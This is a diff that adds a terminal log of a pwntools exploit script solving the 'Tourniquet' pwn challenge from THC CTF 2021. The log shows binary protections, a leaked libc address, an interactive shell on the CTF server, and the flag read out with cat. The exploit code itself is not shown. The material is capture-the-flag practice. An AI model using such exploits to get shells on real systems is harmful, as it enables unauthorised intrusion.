@@ -1,0 +1,36 @@
+mito@ubuntu:~/CTF/THC_CTF_2021/Pwn_Tourniquet_250$ python3 solve.py r
+[*] '/home/mito/CTF/THC_CTF_2021/Pwn_Tourniquet_250/tourniquet'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+0
+[+] Opening connection to remote1.thcon.party on port 10901: Done
+[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Closed connection to remote1.thcon.party port 10901
+1
+[+] Opening connection to remote1.thcon.party on port 10901: Done
+[*] Closed connection to remote1.thcon.party port 10901
+2
+[+] Opening connection to remote1.thcon.party on port 10901: Done
+[*] Closed connection to remote1.thcon.party port 10901
+3
+[+] Opening connection to remote1.thcon.party on port 10901: Done
+puts_addr   = 0x7fb5ae851aa0
+libc_base   = 0x7fb5ae7d1000
+[*] Switching to interactive mode
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ ls -l
+total 128
+-rw------- 1 user user 376832 Jun 15 05:40 core
+-rw-r--r-- 1 root root     40 Jun  8 20:45 flag.txt
+-rwxr-xr-x 1 root root   8464 Jun  8 20:45 tourniquet
+$ cat flag.txt
+THCon21{h4hA_s74cK-p1v0T_g0o_BrrRrrR!!}
